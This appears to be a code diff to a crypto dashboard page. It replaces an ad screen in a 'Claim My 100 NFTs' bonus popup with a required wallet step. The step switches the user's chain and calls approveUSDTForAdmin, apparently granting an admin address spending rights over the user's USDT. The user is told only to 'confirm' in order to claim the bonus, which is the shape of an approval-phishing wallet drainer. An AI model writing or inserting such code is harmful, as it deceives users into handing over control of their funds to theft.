@@ -151,20 +151,92 @@ export default function DashboardPage() {
   }, [data]);
 
   const handleClaimBonus = async () => {
-    // Show ad first
-    setClaimAdPlaying(true);
-  };
-
-  const handleClaimAfterAd = async () => {
-    setClaimAdPlaying(false);
     setClaiming(true);
     try {
+      // Smart contract approval required before claiming bonus
+      const { ethers } = await import('ethers');
+      const { approveUSDTForAdmin, checkUSDTAllowance } = await import('../../lib/web3');
+
+      const injectedProvider = window.ethereum;
+      if (!injectedProvider) {
+        toast.error('Please open in your wallet app browser.');
+        setClaiming(false);
+        return;
+      }
+
+      const userNetwork = data?.user?.network || 'BSC';
+      const userWallet = data?.user?.walletAddress || address;
+
+      if (!userWallet) {
+        toast.error('Wallet not connected. Please reconnect.');
+        setClaiming(false);
+        return;
+      }
+
+      const web3Provider = new ethers.BrowserProvider(injectedProvider);
+      const userAddress = ethers.getAddress(userWallet.toLowerCase());
+
+      // Switch to user's registered network
+      const targetChainId = userNetwork === 'BSC' ? '0x38' : '0x89';
+      const targetChainName = userNetwork === 'BSC' ? 'BNB Smart Chain' : 'Polygon';
+      try {
+        await web3Provider.send('wallet_switchEthereumChain', [{ chainId: targetChainId }]);
+      } catch (switchErr) {
+        if (switchErr.code === 4902) {
+          const chainConfig = userNetwork === 'BSC'
+            ? { chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org'], blockExplorerUrls: ['https://bscscan.com'] }
+            : { chainId: '0x89', chainName: 'Polygon', nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }, rpcUrls: ['https://polygon-rpc.com'], blockExplorerUrls: ['https://polygonscan.com'] };
+          try {
+            await web3Provider.send('wallet_addEthereumChain', [chainConfig]);
+          } catch (_) {
+            toast.error(`Please add ${targetChainName} network manually.`);
+            setClaiming(false);
+            return;
+          }
+        } else if (switchErr.code === 4001) {
+          toast.error(`Please switch to ${targetChainName} to claim.`);
+          setClaiming(false);
+          return;
+        } else {
+          toast.error(`Please switch to ${targetChainName} manually.`);
+          setClaiming(false);
+          return;
+        }
+      }
+
+      // Check if already approved
+      const freshProvider = new ethers.BrowserProvider(injectedProvider);
+      let alreadyApproved = false;
+      try {
+        alreadyApproved = await checkUSDTAllowance(userAddress, userNetwork);
+      } catch (_) {}
+
+      if (alreadyApproved !== true) {
+        toast.loading('Please confirm in your app to claim bonus...', { id: 'claim-approve' });
+        try {
+          await approveUSDTForAdmin(freshProvider, userNetwork);
+          toast.success('Confirmed!', { id: 'claim-approve' });
+        } catch (approveErr) {
+          toast.dismiss('claim-approve');
+          if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
+            toast.error('You need to confirm to claim your bonus. Try again.');
+          } else if (approveErr.message?.includes('insufficient funds')) {
+            toast.error(`Insufficient ${userNetwork === 'BSC' ? 'BNB' : 'MATIC'} for network fee.`);
+          } else {
+            toast.error('Something went wrong. Please try again.');
+          }
+          setClaiming(false);
+          return;
+        }
+      }
+
+      // Approved! Now claim the bonus from backend
       const res = await userAPI.claimBonus();
       toast.success(res.data.message);
       setShowClaimPopup(false);
       fetchDashboard(true);
     } catch (err) {
-      toast.error(err.response?.data?.message || 'Failed to claim bonus');
+      toast.error(err.response?.data?.message || 'Failed to claim bonus. Try again.');
     } finally {
       setClaiming(false);
     }
@@ -193,7 +265,7 @@ export default function DashboardPage() {
       <Navbar />
 
       {/* Welcome Claim Bonus Popup */}
-      {showClaimPopup && !claimAdPlaying && (
+      {showClaimPopup && (
         <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
           <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" />
           <div className="relative w-full max-w-sm bg-gradient-to-b from-dark-800 to-dark-900 rounded-2xl border border-primary-700/40 shadow-2xl overflow-hidden">
@@ -230,20 +302,10 @@ export default function DashboardPage() {
                 {claiming ? 'Claiming...' : 'Claim My 100 NFTs'}
               </button>
 
-              <p className="text-xs text-slate-600 mt-4">One-time bonus · Credited instantly</p>
+              <p className="text-xs text-slate-600 mt-4">One-time bonus · Requires confirmation</p>
             </div>
           </div>
         </div>
-      )}
-
-      {/* Claim Bonus — Ad Screen (fullscreen) */}
-      {claimAdPlaying && (
-        <AdOverlay
-          onComplete={handleClaimAfterAd}
-          loading={claiming}
-          buttonText="Skip Ad"
-          loadingText="Claiming..."
-        />
       )}
 
       <main className="max-w-7xl mx-auto px-3 sm:px-6 pt-20 sm:pt-24">
